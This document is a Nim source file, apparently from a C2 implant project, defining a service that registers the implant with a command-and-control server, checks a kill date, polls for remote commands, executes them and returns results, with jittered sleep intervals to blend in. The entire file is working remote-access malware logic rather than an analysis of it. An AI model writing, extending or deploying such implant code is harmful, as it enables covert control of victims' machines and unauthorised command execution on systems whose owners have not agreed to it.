#[
    Application Service: ImplantOrchestratorService
    Orchestrates the lifecycle of the implant
    Coordinates registration, polling, command execution
    Applies Single Responsibility Principle
]#

import asyncdispatch, random, strutils
import ../../domain/models/[implant, network_health]
import ../../domain/models/command as cmdModel
import ../usecases/[register_implant_usecase, poll_commands_usecase, execute_command_usecase]
import ../services/command_service
import ../../infrastructure/repositories/[communication_repository, command_repository, system_info_repository]

type
    ImplantOrchestratorService* = ref object
        ## Service that orchestrates implant lifecycle
        implant*: Implant
        commandService*: CommandService
        communicationRepo*: CommunicationRepository
        commandRepo*: CommandRepository
        systemInfoRepo*: SystemInfoRepository
        registerUseCase*: RegisterImplantUseCase
        pollUseCase*: PollCommandsUseCase
        executeUseCase*: ExecuteCommandUseCase
        networkHealth*: NetworkHealth
        isRunning*: bool

proc newImplantOrchestratorService*(implant: Implant): ImplantOrchestratorService =
    ## Create a new ImplantOrchestratorService instance
    let commRepo = newCommunicationRepository()
    let cmdRepo = newCommandRepository()
    let sysInfoRepo = newSystemInfoRepository()
    let cmdService = newCommandService()
    
    result = new ImplantOrchestratorService
    result.implant = implant
    result.commandService = cmdService
    result.communicationRepo = commRepo
    result.commandRepo = cmdRepo
    result.systemInfoRepo = sysInfoRepo
    result.registerUseCase = newRegisterImplantUseCase(commRepo, sysInfoRepo)
    result.pollUseCase = newPollCommandsUseCase(commRepo)
    result.executeUseCase = newExecuteCommandUseCase(cmdService)
    result.networkHealth = newNetworkHealth()
    result.isRunning = false

proc initialize*(orchestrator: ImplantOrchestratorService) {.async.} =
    ## Initialize the implant orchestrator
    when defined debug:
        echo "[ORCHESTRATOR] 🚀 Initializing implant orchestrator"
    
    # Check if implant is expired
    if orchestrator.implant.isExpired():
        when defined debug:
            echo "[ORCHESTRATOR] ⚠️ Implant has expired (killDate reached)"
        return
    
    # Register implant if not already registered
    if not orchestrator.implant.registered:
        when defined debug:
            echo "[ORCHESTRATOR] 📝 Registering implant with C2"
        
        let (success, updatedImplant) = await orchestrator.registerUseCase.register(orchestrator.implant)
        orchestrator.implant = updatedImplant
        if not success:
            when defined debug:
                echo "[ORCHESTRATOR] ❌ Failed to register implant"
            return
    
    orchestrator.isRunning = true
    when defined debug:
        echo "[ORCHESTRATOR] ✅ Implant orchestrator initialized"

proc runPollingLoop*(orchestrator: ImplantOrchestratorService) {.async.} =
    ## Run the main polling loop
    when defined debug:
        echo "[ORCHESTRATOR] 🔄 Starting polling loop"
    
    var cycleCount = 0
    
    while orchestrator.isRunning:
        try:
            cycleCount += 1
            
            when defined debug:
                echo "[ORCHESTRATOR] 🔄 Polling cycle #" & $cycleCount
            
            # Check if implant is expired
            if orchestrator.implant.isExpired():
                when defined debug:
                    echo "[ORCHESTRATOR] ⚠️ Implant expired, stopping"
                orchestrator.isRunning = false
                break
            
            # Poll for commands
            let cmd = await orchestrator.pollUseCase.pollForCommand(orchestrator.implant)
            
            if cmd.command != "" and cmd.guid != "":
                # Filter out internal error messages
                if cmd.command == "NIMPLANT_CONNECTION_ERROR" or cmd.command.startsWith("ERROR:") or cmd.command == "NO_COMMANDS":
                    when defined debug:
                        echo "[ORCHESTRATOR] 🚫 Ignoring internal status message: " & cmd.command
                else:
                    when defined debug:
                        echo "[ORCHESTRATOR] 📨 Received command: " & cmd.command & " (GUID: " & cmd.guid & ")"
                    
                    # Execute command using execute use case
                    let cmdResult = orchestrator.executeUseCase.execute(orchestrator.implant, cmd)
                    
                    # Send result back
                    let sent = await orchestrator.pollUseCase.sendResult(orchestrator.implant, cmdResult)
                    
                    if sent:
                        when defined debug:
                            echo "[ORCHESTRATOR] ✅ Command executed and result sent"
                    else:
                        when defined debug:
                            echo "[ORCHESTRATOR] ❌ Failed to send result"
            
            # Calculate adaptive sleep interval
            let baseInterval = orchestrator.implant.sleepTime * 1000  # Convert to milliseconds
            var health = orchestrator.networkHealth  # Need var for getAdaptivePollingInterval
            let sleepMs = health.getAdaptivePollingInterval(baseInterval)
            orchestrator.networkHealth = health  # Update back
            
            # Add jitter
            let jitterMs = if orchestrator.implant.sleepJitter > 0:
                int(float(sleepMs) * (orchestrator.implant.sleepJitter / 100.0) * rand(1.0))
            else:
                0
            
            let totalSleepMs = sleepMs + jitterMs
            
            when defined debug:
                echo "[ORCHESTRATOR] 💤 Sleeping for " & $totalSleepMs & "ms"
            
            await sleepAsync(totalSleepMs)
            
        except Exception as e:
            when defined debug:
                echo "[ORCHESTRATOR] ❌ Error in polling loop: " & e.msg
            await sleepAsync(2000)  # Error recovery sleep

proc stop*(orchestrator: ImplantOrchestratorService) =
    ## Stop the orchestrator
    orchestrator.isRunning = false
    when defined debug:
        echo "[ORCHESTRATOR] 🛑 Orchestrator stopped"

